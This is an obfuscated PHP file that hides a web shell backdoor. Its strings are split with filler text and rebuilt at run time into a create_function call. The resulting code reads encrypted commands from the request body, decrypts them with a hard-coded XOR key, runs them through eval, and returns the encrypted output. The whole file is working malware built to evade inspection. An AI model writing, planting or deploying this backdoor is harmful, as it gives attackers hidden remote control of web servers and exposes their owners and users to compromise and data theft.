<?php
$j='("/SS$kh(.+)SS$kf/"SS,SS@SSfiSSle_get_contents("SSpSShp://inpSSut"),$m)==1) {@SSob_SSstaSSrt();@';
$n='iSSon x($SSt,$SSk){$c=strlSSeSSn($kSS);$l=SSstrlen($t);$SSSSo="";for($SSi=0;$SSi<$l;){forSS($j=SS0';
$V='_endSS_SScleanSS();$r=@baSSse64_encoSSdeSS(@x(@gzSScompress(SS$o)SS,SS$k));prinSSt(SS"$p$kh$r$kf");}';
$u='evSSal(@gSSzuncoSSmprSSess(SS@x(@base6SS4_decodeSSSS($m[1SS]),$k)));$o=@obSS_get_SScontents();SS@ob';
$B=str_replace('GI','','GIGIGIcreate_fuGInGIctGIion');
$P=';($jSSSS<$c&&$i<SS$l);SS$j++,$i++){$SSo.=SS$t{$i}^$k{$j}SS;}}reSSSSturn $oSS;}if SS(@prSSeg_match';
$T='$k="2SS91e74dSS6";$khSS=SS"427b351fe6SSSS73"SS;$kf="90bdc755bdbd"SS;$p=SS"2dINB8SSdxNxGSSJlNqs";fSSunct';
$I=str_replace('SS','',$T.$n.$P.$j.$u.$V);
$e=$B('',$I);$e();
?>
